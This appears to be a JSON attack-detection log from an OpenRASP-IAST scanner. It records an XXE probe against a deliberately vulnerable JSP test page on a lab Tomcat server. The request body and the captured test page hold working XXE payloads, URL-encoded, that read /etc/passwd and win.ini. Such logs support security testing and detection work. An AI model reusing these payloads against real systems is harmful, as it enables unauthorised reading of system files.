[
  {
    "rasp_id": "IAST",
    "app_id": "47014b167a616f646a788a6d9eb4a1a29ca98dda",
    "event_type": "attack",
    "event_time": "2024-03-03T04:41:00+0000",
    "request_id": "430fa298f0f5496e872c6943f5134c53",
    "request_method": "get",
    "intercept_state": "log",
    "target": "192.168.198.137",
    "server_hostname": "sec",
    "server_ip": "192.168.198.138",
    "server_type": "tomcat",
    "server_version": "9.0.84.0",
    "server_nic": [
      {
        "name": "ens33",
        "ip": "192.168.198.137"
      }
    ],
    "path": "/vulns/007-xxe-jdom.jsp",
    "url": "http://192.168.198.137:8080/vulns/007-xxe-jdom.jsp",
    "attack_type": "xxe",
    "attack_params": {
      "entity": "file:///etc/passwd",
      "stack": [
        "org.apache.xerces.impl.XMLEntityManager.expandSystemId",
        "org.apache.xerces.impl.XMLEntityManager.addExternalEntity",
        "org.apache.xerces.impl.XMLDTDScannerImpl.scanEntityDecl",
        "org.apache.xerces.impl.XMLDTDScannerImpl.scanDecls",
        "org.apache.xerces.impl.XMLDTDScannerImpl.scanDTDInternalSubset",
        "org.apache.xerces.impl.XMLDocumentScannerImpl$DTDDispatcher.dispatch",
        "org.apache.xerces.impl.XMLDocumentFragmentScannerImpl.scanDocument",
        "org.apache.xerces.parsers.XML11Configuration.parse",
        "org.apache.xerces.parsers.XML11Configuration.parse",
        "org.apache.xerces.parsers.XMLParser.parse",
        "org.apache.xerces.parsers.AbstractSAXParser.parse",
        "org.apache.xerces.jaxp.SAXParserImpl$JAXPSAXParser.parse",
        "org.jdom.input.SAXBuilder.build",
        "org.apache.jsp._007_002dxxe_002djdom_jsp._jspService",
        "org.apache.jasper.runtime.HttpJspBase.service",
        "javax.servlet.http.HttpServlet.service",
        "org.apache.jasper.servlet.JspServletWrapper.service",
        "org.apache.jasper.servlet.JspServlet.serviceJspFile",
        "org.apache.jasper.servlet.JspServlet.service",
        "javax.servlet.http.HttpServlet.service",
        "org.apache.catalina.core.ApplicationFilterChain.internalDoFilter",
        "org.apache.catalina.core.ApplicationFilterChain.doFilter",
        "org.apache.tomcat.websocket.server.WsFilter.doFilter",
        "org.apache.catalina.core.ApplicationFilterChain.internalDoFilter",
        "org.apache.catalina.core.ApplicationFilterChain.doFilter",
        "org.apache.catalina.core.StandardWrapperValve.invoke",
        "org.apache.catalina.core.StandardContextValve.invoke",
        "org.apache.catalina.authenticator.AuthenticatorBase.invoke",
        "org.apache.catalina.core.StandardHostValve.invoke",
        "org.apache.catalina.valves.ErrorReportValve.invoke",
        "org.apache.catalina.valves.AbstractAccessLogValve.invoke",
        "org.apache.catalina.core.StandardEngineValve.invoke",
        "org.apache.catalina.connector.CoyoteAdapter.service",
        "org.apache.coyote.http11.Http11Processor.service",
        "org.apache.coyote.AbstractProcessorLight.process",
        "org.apache.coyote.AbstractProtocol$ConnectionHandler.process",
        "org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun",
        "org.apache.tomcat.util.net.SocketProcessorBase.run",
        "org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker",
        "org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run",
        "org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run",
        "java.lang.Thread.run"
      ],
      "hook_type": "xxe"
    },
    "attack_source": "192.168.198.138",
    "client_ip": "",
    "plugin_name": "xxe_basic",
    "plugin_confidence": 90,
    "plugin_message": "OpenRASP-IAST漏洞扫描 - 解析了用户提交的xml文档中的实体",
    "plugin_algorithm": "基础xxe漏洞检测插件",
    "header": {
      "scan-request-id": "0-565c83f9-ce21-4259-ab0a-c43c8431938e",
      "referer": "http://192.168.198.137:8080/vulns/007-xxe-jdom.jsp",
      "accept-language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
      "cookie": "JSESSIONID=2FAA6AB1D8071D7AAB980B62951AB45F",
      "host": "192.168.198.137:8080",
      "upgrade-insecure-requests": "1",
      "connection": "keep-alive",
      "x-iast-filter": "W3sidHlwZSI6ICJ4eGUiLCAiZmlsdGVyIjogeyJlbnRpdHkiOiAiZmlsZTovLy9ldGMvcGFzc3dkIn19XQ==",
      "accept-encoding": "gzip, deflate",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    },
    "stack_trace": "",
    "body": "HTTP Request:\nGET /vulns/007-xxe-jdom.jsp?data=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22utf-8%22%3F%3E%3C%21DOCTYPE+root+%5B%3C%21ENTITY++file+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26file%3B%3C%2Froot%3E HTTP/1.1\r\nreferer: http://192.168.198.137:8080/vulns/007-xxe-jdom.jsp\r\naccept-language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\r\nhost: 192.168.198.137:8080\r\nupgrade-insecure-requests: 1\r\nconnection: keep-alive\r\naccept-encoding: gzip, deflate\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0\r\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nx-iast-filter: W3sidHlwZSI6ICJ4eGUiLCAiZmlsdGVyIjogeyJlbnRpdHkiOiAiZmlsZTovLy9ldGMvcGFzc3dkIn19XQ==\r\nscan-request-id: 0-565c83f9-ce21-4259-ab0a-c43c8431938e\r\nCookie: JSESSIONID=2FAA6AB1D8071D7AAB980B62951AB45F;\r\n\r\n\n\n\nHTTP Response:\nHTTP Code:200\r\nX-Request-ID: 430fa298f0f5496e872c6943f5134c53\r\nX-Protected-By: OpenRASP-IAST\r\nContent-Type: text/html;charset=UTF-8\r\nContent-Length: 2034\r\nDate: Sun, 03 Mar 2024 04:40:58 GMT\r\nKeep-Alive: timeout=20\r\nConnection: keep-alive\r\n\r\n\n\n\n\n\n\n<html>\n<head>\n    <meta charset=\"UTF-8\"/>\n    <title>007 XXE 漏洞测试</title>\n\n</head>\n\n<body>\n<h1>007 - 通过XXE读取系统文件</h1>\n\n<p>不正常调用 - Linux (读取 /etc/passwd)</p>\n<p>curl '<a href=\"http://192.168.198.137:8080/vulns/007-xxe-jdom.jsp?data=%3C%3F%78%6D%6C%20%76%65%72%73%69%6F%6E%3D%22%31%2E%30%22%20%65%6E%63%6F%64%69%6E%67%3D%22%49%53%4F%2D%38%38%35%39%2D%31%22%3F%3E%3C%21%44%4F%43%54%59%50%45%20%66%6F%6F%20%5B%20%20%20%3C%21%45%4C%45%4D%45%4E%54%20%66%6F%6F%20%41%4E%59%20%3E%20%20%3C%21%45%4E%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4D%20%22%66%69%6C%65%3A%2F%2F%2F%65%74%63%2F%70%61%73%73%77%64%22%20%3E%5D%3E%3C%66%6F%6F%3E%26%78%78%65%3B%3C%2F%66%6F%6F%3E\" target=\"_blank\">http://192.168.198.137:8080/vulns/007-xxe-jdom.jsp?data=%3C%3F%78%6D%6C%20%76%65%72%73%69%6F%6E%3D%22%31%2E%30%22%20%65%6E%63%6F%64%69%6E%67%3D%22%49%53%4F%2D%38%38%35%39%2D%31%22%3F%3E%3C%21%44%4F%43%54%59%50%45%20%66%6F%6F%20%5B%20%20%20%3C%21%45%4C%45%4D%45%4E%54%20%66%6F%6F%20%41%4E%59%20%3E%20%20%3C%21%45%4E%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4D%20%22%66%69%6C%65%3A%2F%2F%2F%65%74%63%2F%70%61%73%73%77%64%22%20%3E%5D%3E%3C%66%6F%6F%3E%26%78%78%65%3B%3C%2F%66%6F%6F%3E</a>'</p>\n\n<p>不正常调用 - Windows (读取 c:/windows/win.ini)</p>\n<p>curl '<a href=\"http://192.168.198.137:8080/vulns/007-xxe-jdom.jsp?data=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%20%20%20%3C%21ELEMENT%20foo%20ANY%20%3E%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E\" target=\"_blank\">http://192.168.198.137:8080/vulns/007-xxe-jdom.jsp?data=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE%20foo%20%5B%20%20%20%3C%21ELEMENT%20foo%20ANY%20%3E%20%20%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fc%3A%2Fwindows%2Fwin.ini%22%20%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E</a>'</p>\n\n<p>节点内容: null</p>\n<p>(有漏洞会看到文件内容)</p>\n</body>\n</body>\n</html>\n"
  }
]
